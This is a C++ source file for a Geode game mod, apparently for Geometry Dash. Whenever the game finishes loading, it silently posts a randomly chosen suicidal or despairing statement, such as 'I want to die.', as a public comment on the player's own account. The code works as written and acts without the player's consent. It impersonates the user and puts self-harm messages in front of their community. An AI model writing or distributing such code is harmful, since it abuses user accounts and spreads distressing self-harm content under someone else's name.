#include <Geode/Geode.hpp>
#include <random>
#include <string>
#include <vector>


using namespace geode::prelude;

#include <Geode/modify/LoadingLayer.hpp>

struct IWannaKillMyself : Modify<IWannaKillMyself, LoadingLayer> {
    void loadingFinished() {
        LoadingLayer::loadingFinished();
        auto manager = GameLevelManager::sharedState();

        std::vector<std::string> quotes = {
            "I want to die.",
            "Should i die now?",
            "Anyone wants to kill me?",
            "I am soooo happy...",
            "I'm fine...",
            "I'm so tired of being alive.",
            "Smiling hurts.",
            "No one loves me.",
            "I'm so lost in this world.",
            "I'm so tired of hoping.",
            "I'm so tired of this life.",
            "I feel so alone in this world.",
            "I can't take it anymore.",
            "I just want to disappear.",
            "I'm so tired of trying.",
            "I'm drowning in my own thoughts.",
            "I'm suffocating in my own mind.",
            "I'm so broken inside.",
            "I'm so tired of pretending to be happy.",
            "I'm so tired of being strong."};

        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, quotes.size() - 1);
        std::string randomQuote = quotes[dis(gen)];
        manager->uploadAccountComment(randomQuote);
    }
};
